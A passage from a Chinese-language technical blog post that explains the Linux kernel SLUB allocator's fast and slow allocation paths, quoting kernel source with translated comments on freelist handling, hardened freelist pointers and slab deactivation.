__slab_alloc(s, gfpflags, node, addr, c, orig_size);<br></code></pre></td></tr></table></figure><p>若有 freelist &amp; slub，则<strong>调用 <code>get_freepointer_safe()</code> 获取当前空闲对象下一个空闲对象</strong>；接下来 <code>this_cpu_cmpxchg_double()</code> 会检查是否 <code>freelist == object</code>、<code>cpu_slab-&gt;tid == tid</code>，若是则<strong>将 freelist 设为 next_object 并获取设置下一 tid</strong>，否则说明发生了抢占（我们已经不在原 cpu 上了），跳转回 <code>redo</code> 重新在当前 cpu 上进行分配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">void</span> *next_object = get_freepointer_safe(s, object);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 仅当没有额外操作且我们在正确的处理器上时 cmpxchg 将匹配.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * cmpxchg 原子地进行了如下： (没有锁语义!)</span><br><span class="hljs-comment"> * 1. 重定位第一个指针到当前的 per cpu 区域.</span><br><span class="hljs-comment"> * 2. 验证 tid &amp; freelist 没有被改变</span><br><span class="hljs-comment"> * 3. 若未被改变，替换 tid &amp; freelist</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 自从没有锁语义，保护仅需要对抗在该 cpu 上执行的代码*不*从其他的 cpu 上访问.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(!this_cpu_cmpxchg_double(<br>s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,<br>object, tid,<br>next_object, next_tid(tid)))) &#123;<br><br>note_cmpxchg_failure(<span class="hljs-string">&quot;slab_alloc&quot;</span>, s, tid);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后对于直接从 cpu_slab 上分配的对象会通过 <code>prefetch_freepointer()</code> 调用 prefetchw 指令提前将已分配对象的地址载入缓存中，之后就是返回分配成功的空闲对象</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">prefetch_freepointer(s, next_object);<br>stat(s, ALLOC_FASTPATH);<br>&#125;<br><br><span class="hljs-keyword">return</span> object;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="II-slab-alloc-：获取另一-slab-进行分配（slow-path）"><a href="#II-slab-alloc-：获取另一-slab-进行分配（slow-path）" class="headerlink" title="II. ___slab_alloc()：获取另一 slab 进行分配（slow path）"></a>II. ___slab_alloc()：获取另一 slab 进行分配（slow path）</h3><p><code>__slab_alloc()</code> 其实是在开启了抢占的情况下（默认开启）对 <code>___slab_alloc()</code> 的一个简单的 wrapper，主要就是重新读取 <code>kmem_cache_cpu</code> 的指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 当抢占没有关闭时 ___slab_alloc() 用于上下文的 wrapper.</span><br><span class="hljs-comment"> * 通过重新获取 percpu 区域的指针来补偿可能的 cpu 更改.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *__slab_alloc(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node,<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-keyword">struct</span> kmem_cache_cpu *c, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> orig_size)<br>&#123;<br><span class="hljs-type">void</span> *p;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PREEMPT_COUNT</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们可能已被抢占且在关闭抢占前调度到了不同的 cpu 上.</span><br><span class="hljs-comment"> * 需要重新载入 cpu 区域指针.</span><br><span class="hljs-comment"> */</span><br>c = slub_get_cpu_ptr(s-&gt;cpu_slab);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>p = ___slab_alloc(s, gfpflags, node, addr, c, orig_size);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PREEMPT_COUNT</span><br>slub_put_cpu_ptr(s-&gt;cpu_slab);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来我们来看 <code>___slab_alloc()</code>，该函数便是慢速分配路径的核心函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 慢速路径. 无锁 freelist 为空或是我们需要进行调试任务.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若新的对象已经被释放到常规的 freelist 上，则过程仍是很快的.</span><br><span class="hljs-comment"> * 这种情况下我们简单地让常规的 freelist 取代无锁 freelist</span><br><span class="hljs-comment"> * 并 zap the regular freelist.（zap想不出咋翻译好😄）</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若这不起作用，则我们回退到 partial 链表. 我们将 freelist 上的第一个元素</span><br><span class="hljs-comment"> * 作为要分配的对象并将 freelist 的剩余部分移动到无锁 freelist.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若我们无法从 partial slab 链表上获得一个新的 slab，我们需要分配一个新的 slab.</span><br><span class="hljs-comment"> * 因为这包含对页分配器的调用与新 slab 的设置，这是最慢的路径.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 当我们知道抢占被禁用时所用的 __slab_alloc 的版本 (也是造成大量分配的原因).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *___slab_alloc(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node,<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-keyword">struct</span> kmem_cache_cpu *c, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> orig_size)<br>&#123;<br><span class="hljs-type">void</span> *freelist;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">partial_context</span> <span class="hljs-title">pc</span>;</span><br><br>stat(s, ALLOC_SLOWPATH);<br></code></pre></td></tr></table></figure><p>接下来笔者按照代码标签顺序进行分析</p><h4 id="①-reread-slab：读取-percpu-slab"><a href="#①-reread-slab：读取-percpu-slab" class="headerlink" title="① reread_slab：读取 percpu slab"></a>① reread_slab：读取 percpu slab</h4><p>首先读取 percpu 的 slab，若没有 slab 则判断分配节点，并跳转到 <code>new_slab</code> 分配新的 slab，注意这一块代码对应 <code>reread_slab</code> 标签：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">reread_slab:<br><br>slab = READ_ONCE(c-&gt;slab);<br><span class="hljs-keyword">if</span> (!slab) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若 node 未上线或没有 normal memory，忽略 node 约束</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(node != NUMA_NO_NODE &amp;&amp;<br>     !node_isset(node, slab_nodes)))<br>node = NUMA_NO_NODE;<br><span class="hljs-keyword">goto</span> new_slab;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="②-redo：获取-percpu-slab-gt-freelist"><a href="#②-redo：获取-percpu-slab-gt-freelist" class="headerlink" title="② redo：获取 percpu slab-&gt;freelist"></a>② redo：获取 percpu slab-&gt;freelist</h4><p>接下来这块代码对应 <code>redo</code> 标签：</p><ul><li><p>若 percpu slab 不为空，判断 slab 是否属于指定的节点且与分配标志位匹配，若否，则跳转到 <code>deactivate_slab</code> 标签</p></li><li><p>接下来检查 slab 是否仍为原来的 cpu slab（因为我们可能被抢占），若否，则跳转回 <code>reread_slab</code></p></li><li><p>接下来获取 per-cpu 的 freelist，若不为空，则跳转到 <code>load_freelist</code>，否则<strong>调用 <code>get_freelist()</code> 获取 slab 的 freelist</strong></p></li><li><p>若 slab 的 freelist 仍为空，将 per-cpu freelist 设为 NULL，获取下一个 tid，并跳转到 <code>new_slab</code> 分配新的 slab</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c">redo:<br><br><span class="hljs-keyword">if</span> (unlikely(!node_match(slab, node))) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 与上面相同但 node_match() 为 false 则早已说明 node != NUMA_NO_NODE</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!node_isset(node, slab_nodes)) &#123;<br>node = NUMA_NO_NODE;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>stat(s, ALLOC_NODE_MISMATCH);<br><span class="hljs-keyword">goto</span> deactivate_slab;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们理应搜索一个 PFMEMALLOC 的 slab 页面，但现在，</span><br><span class="hljs-comment"> * 当页面离开 per-cpu 分配器，我们正在失去 pfmemalloc 信息</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(!pfmemalloc_match(slab, gfpflags)))<br><span class="hljs-keyword">goto</span> deactivate_slab;<br><br><span class="hljs-comment">/* 必须再次检查 c-&gt;slab 以免我们被抢占使其发生了更改 */</span><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">goto</span> reread_slab;<br>&#125;<br>freelist = c-&gt;freelist;<br><span class="hljs-keyword">if</span> (freelist)<br><span class="hljs-keyword">goto</span> load_freelist;<br><br>freelist = get_freelist(s, slab);<br><br><span class="hljs-keyword">if</span> (!freelist) &#123;<br>c-&gt;slab = <span class="hljs-literal">NULL</span>;<br>c-&gt;tid = next_tid(c-&gt;tid);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br>stat(s, DEACTIVATE_BYPASS);<br><span class="hljs-keyword">goto</span> new_slab;<br>&#125;<br><br>stat(s, ALLOC_REFILL);<br></code></pre></td></tr></table></figure><p><code>get_freelist()</code> 函数主要就是获取 <code>slab-&gt;freelist</code> 后将 <code>slab-&gt;freelist</code> 设为 NULL 并返回原来的 freelist</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 检查 slab-&gt;freelist 并将 freelist 传送给 percpu freelist</span><br><span class="hljs-comment"> * 或是将 slab 给 deactivate.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若返回值非 NULL 则 slab 仍被冻结.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若该函数返回 NULL 则 slab 被解冻.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">get_freelist</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">new</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;<br><span class="hljs-type">void</span> *freelist;<br><br>lockdep_assert_held(this_cpu_ptr(&amp;s-&gt;cpu_slab-&gt;lock));<br><br><span class="hljs-keyword">do</span> &#123;<br>freelist = slab-&gt;freelist;<br>counters = slab-&gt;counters;<br><br>new.counters = counters;<br>VM_BUG_ON(!new.frozen);<br><br>new.inuse = slab-&gt;objects;<br>new.frozen = freelist != <span class="hljs-literal">NULL</span>;<br><br>&#125; <span class="hljs-keyword">while</span> (!__cmpxchg_double_slab(s, slab,<br>freelist, counters,<br><span class="hljs-literal">NULL</span>, new.counters,<br><span class="hljs-string">&quot;get_freelist&quot;</span>));<br><br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="③-load-freelist：从-freelist-分配对象"><a href="#③-load-freelist：从-freelist-分配对象" class="headerlink" title="③ load_freelist：从 freelist 分配对象"></a>③ load_freelist：从 freelist 分配对象</h4><p>继续返回 <code>___slab_alloc()</code> 中，接下来这块代码对应 <code>load_freelist</code> 标签，主要就是调用 <code>get_freepointer()</code> 将 percpu freelist 指向第二个空闲对象，并获取下一个 tid 后返回前面获取的 freelist（也就是第一个空闲对象）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">load_freelist:<br><br>lockdep_assert_held(this_cpu_ptr(&amp;s-&gt;cpu_slab-&gt;lock));<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * freelist 指向要被使用的对象链表. slab 指向获得对象的 slab.</span><br><span class="hljs-comment"> * 因此 slab 必须被冻结以让 percpu 的分配正常工作.</span><br><span class="hljs-comment"> */</span><br>VM_BUG_ON(!c-&gt;slab-&gt;frozen);<br>c-&gt;freelist = get_freepointer(s, freelist);<br>c-&gt;tid = next_tid(c-&gt;tid);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">return</span> freelist;<br></code></pre></td></tr></table></figure><p>这里注意在 <code>get_freepointer()</code> 里套了两层，最后会调用到 <code>freelist_ptr()</code> 获取到第二个空闲对象的指针，这里需要注意的是当开启了 Hardened freelist 保护后在 next 指针的位置存放的是 <strong>第一个空闲对象地址 ^ 第二个空闲对象地址 ^ 一个随机值</strong>（<code>kmem_cache-&gt;random</code>）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 返回 freelist 指针 (ptr). 在有加固的情况下其通过一个</span><br><span class="hljs-comment"> * 对存储指针的地址与 per-cache 随机值的异或进行混淆.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">freelist_ptr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">void</span> *ptr,</span><br><span class="hljs-params"> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ptr_addr)</span><br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 当开启了 CONFIG_KASAN_SW/HW_TAGS, ptr_addr 可能被打上标签.</span><br><span class="hljs-comment"> * 通常这不会造成任何问题，因为 set_freepointer() 与 get_freepointer() </span><br><span class="hljs-comment"> * 调用时都会有标签相同的指针.</span><br><span class="hljs-comment"> * 但是 CONFIG_SLUB_DEBUG 的代码有些问题. 例如当 __free_slub() 在</span><br><span class="hljs-comment"> * 一个 cache 中迭代对象时,其将没有标签的指针传给 check_object(). </span><br><span class="hljs-comment"> * check_object() 依次带着一个没有标签的指针调用 get_freepointer()，</span><br><span class="hljs-comment"> * 从而造成 freepointer 存储错误.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *)((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ptr ^ s-&gt;random ^<br>swab((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)kasan_reset_tag((<span class="hljs-type">void</span> *)ptr_addr)));<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-keyword">return</span> ptr;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure><p>从这里我们也可以看出 <strong>slab-&gt;freelist 是没有加密的，但链表上的后续指针都是加密了的</strong></p><h4 id="④-deactivate-slab：deactivate-percpu-slab"><a href="#④-deactivate-slab：deactivate-percpu-slab" class="headerlink" title="④ deactivate_slab：deactivate percpu slab"></a>④ deactivate_slab：deactivate percpu slab</h4><p>继续返回 <code>___slab_alloc()</code> 中，接下来这块代码对应 <code>deactivate_slab</code> 标签，首先还是惯例地检查是否被抢占调度到了别的 CPU，若是则跳转回 <code>reread_slab</code>；之后就是简单地将 percpu 的 slab 和 freelist 设为 NULL 并获取下一个 tid，之后调用 <code>deactivate_slab()</code> 将这张 slab 给 deactivate 了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">deactivate_slab:<br><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (slab != c-&gt;slab) &#123;<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">goto</span> reread_slab;<br>&#125;<br>freelist = c-&gt;freelist;<br>c-&gt;slab = <span class="hljs-literal">NULL</span>;<br>c-&gt;freelist = <span class="hljs-literal">NULL</span>;<br>c-&gt;tid = next_tid(c-&gt;tid);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br>deactivate_slab(s, slab, freelist);<br></code></pre></td></tr></table></figure><p><code>deactivate_slab()</code> 的逻辑如下：</p><ul><li>遍历 freelist 检查是否被破坏，放弃被破坏的部分</li><li>将 <code>slab-&gt;freelist</code> 设为原 <code>kmem_cache_cpu-&gt;freelist</code>，若 slab 上原有 freelist 不为 NULL 则再接到后面</li><li>设置 slab 的 counters，其中<strong>将 <code>frozen</code> 设为 0</strong></li><li>若 slab 上的对象全部空闲**且 node 的 partial slab 数量大于 <code>kmem_cache-&gt;min_partial</code>**，调用 <code>discard_slab()</code> 将 slab 释放</li><li>若 slab 上存在空闲对象，调用 <code>add_partial()</code> 将其加入 node 的 partial 链表</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 结束移除 cpu slab. 合并 cpu&#x27;s freelist 与 slab&#x27;s freelist,</span><br><span class="hljs-comment"> * 解冻 slabs 并放在合适的链表上.</span><br><span class="hljs-comment"> * 假设 slab 已经被调用者安全地从 kmem_cache_cpu 上取下.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">deactivate_slab</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab,</span><br><span class="hljs-params">    <span class="hljs-type">void</span> *freelist)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">slab_modes</span> &#123;</span> M_NONE, M_PARTIAL, M_FREE, M_FULL_NOLIST &#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">n</span> =</span> get_node(s, slab_nid(slab));<br><span class="hljs-type">int</span> free_delta = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">slab_modes</span> <span class="hljs-title">mode</span> =</span> M_NONE;<br><span class="hljs-type">void</span> *nextfree, *freelist_iter, *freelist_tail;<br><span class="hljs-type">int</span> tail = DEACTIVATE_TO_HEAD;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">new</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">old</span>;</span><br><br><span class="hljs-keyword">if</span> (slab-&gt;freelist) &#123;<br>stat(s, DEACTIVATE_REMOTE_FREES);<br>tail = DEACTIVATE_TO_TAIL;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 阶段一: 统计 cpu&#x27;s freelist 上的对象数量（free_delta） </span><br><span class="hljs-comment"> * 并保存最后一个对象（freelist_tail） 用于后面的拼接.</span><br><span class="hljs-comment"> */</span><br>freelist_tail = <span class="hljs-literal">NULL</span>;<br>freelist_iter = freelist;<br><span class="hljs-keyword">while</span> (freelist_iter) &#123;<br>nextfree = get_freepointer(s, freelist_iter);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若 &#x27;nextfree&#x27; 无效, 在 &#x27;freelist_iter&#x27; 上的对象可能已被破坏.</span><br><span class="hljs-comment"> * 故通过略过 &#x27;freelist_iter&#x27; 起的所有对象来进行隔离.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (freelist_corrupted(s, slab, &amp;freelist_iter, nextfree))<br><span class="hljs-keyword">break</span>;<br><br>freelist_tail = freelist_iter;<br>free_delta++;<br><br>freelist_iter = nextfree;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 阶段二: 解冻slab并将per-cpu freelist拼接到slab&#x27;s freelist头部.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 确保链表的存在反映了在解冻期间实际的对象数量时，slab 已被解冻.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 我们首先在持有锁的情况下进行compxchg并当其成功时将 slab 插入链表.</span><br><span class="hljs-comment"> * 若有不匹配的情况则 slab 为未冻结且 slab 上的数量可能发生了改变.</span><br><span class="hljs-comment"> * 释放锁并再次重试 cmpxchg.</span><br><span class="hljs-comment"> */</span><br>redo:<br><br>old.freelist = READ_ONCE(slab-&gt;freelist);<br>old.counters = READ_ONCE(slab-&gt;counters);<br>VM_BUG_ON(!old.frozen);<br><br><span class="hljs-comment">/* 确定 slab 的目标状态 */</span><br>new.counters = old.counters;<br><span class="hljs-keyword">if</span> (freelist_tail) &#123;<br>new.inuse -= free_delta;<br>set_freepointer(s, freelist_tail, old.freelist);<br>new.freelist = freelist;<br>&#125; <span class="hljs-keyword">else</span><br>new.freelist = old.freelist;<br><br>new.frozen = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (!new.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial) &#123;<br>mode = M_FREE;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (new.freelist) &#123;<br>mode = M_PARTIAL;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 